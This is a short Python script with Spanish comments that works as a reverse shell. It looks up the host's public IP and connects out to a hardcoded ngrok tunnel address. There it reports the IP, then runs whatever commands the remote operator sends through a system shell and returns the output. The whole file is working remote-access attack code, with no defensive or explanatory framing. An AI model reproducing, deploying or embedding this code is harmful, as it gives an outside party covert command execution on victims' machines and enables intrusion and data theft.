import socket
import subprocess
import os
import requests

def obtener_ip_publica():
    try:
        
        response = requests.get('https://api.ipify.org')
        
        if response.status_code == 200:
            return response.text
        else:
            return "noip"
    except Exception as e:
        print("Error:", e)


def main():
    host = '5.tcp.eu.ngrok.io'  # Cambia esto por la dirección IP del servidor
    port = 16343  # Puerto en el que el servidor está escuchando
    public_ip = obtener_ip_publica()
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host, port))
        if public_ip:
            s.sendall(public_ip.encode())
        while True:
            command = s.recv(1024).decode()
            #print(command)
            if command.lower() == 'exit':
                break
            elif command.startswith('cd '):
                directory = command.split(' ', 1)[1]
                try:
                    os.chdir(directory)
                    output = f"Cambiado al directorio: {os.getcwd()}"
                except Exception as e:
                    output = str(e)
            elif not command or command =="":
                output = "No encuentro comando"
            else:
                try:
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                    if not output:
                        output = "Void"
                except Exception as e:
                    output = str(e).encode()
            if isinstance(output, bytes):
                try:
                    output = output.decode('utf-8')
                except UnicodeDecodeError:
                    output = output.decode('latin-1')
            s.sendall(output.encode())




if __name__ == "__main__":
    main()
